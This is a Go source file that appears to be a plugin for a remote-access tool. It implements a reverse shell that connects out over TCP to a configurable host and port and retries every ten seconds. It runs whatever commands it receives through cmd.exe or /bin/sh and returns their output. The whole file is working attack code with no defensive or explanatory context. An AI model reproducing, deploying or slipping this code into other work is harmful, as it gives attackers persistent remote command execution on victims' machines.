package plugins

import (
    "bufio"
    "fmt"
    "net"
    "os/exec"
    "runtime"
    "strings"
    "time"
)

type ReverseShell struct {
    host   string
    port   int
    active bool
}

func NewReverseShell(host string, port int) *ReverseShell {
    return &ReverseShell{
        host: host,
        port: port,
    }
}

func (r *ReverseShell) Start() {
    r.active = true
    for r.active {
        conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", r.host, r.port))
        if err == nil {
            r.handleConnection(conn)
            conn.Close()
        }
        time.Sleep(10 * time.Second)
    }
}

func (r *ReverseShell) handleConnection(conn net.Conn) {
    for {
        // Read command
        netData, err := bufio.NewReader(conn).ReadString('\n')
        if err != nil {
            return
        }
        
        cmd := strings.TrimSpace(string(netData))
        if cmd == "exit" {
            r.active = false
            return
        }
        
        // Execute command
        output := r.execCommand(cmd)
        conn.Write([]byte(output + "\n"))
    }
}

func (r *ReverseShell) execCommand(command string) string {
    var cmd *exec.Cmd
    
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd.exe", "/C", command)
    } else {
        cmd = exec.Command("/bin/sh", "-c", command)
    }
    
    output, err := cmd.CombinedOutput()
    if err != nil {
        return fmt.Sprintf("Error: %v\n", err)
    }
    return string(output)
}
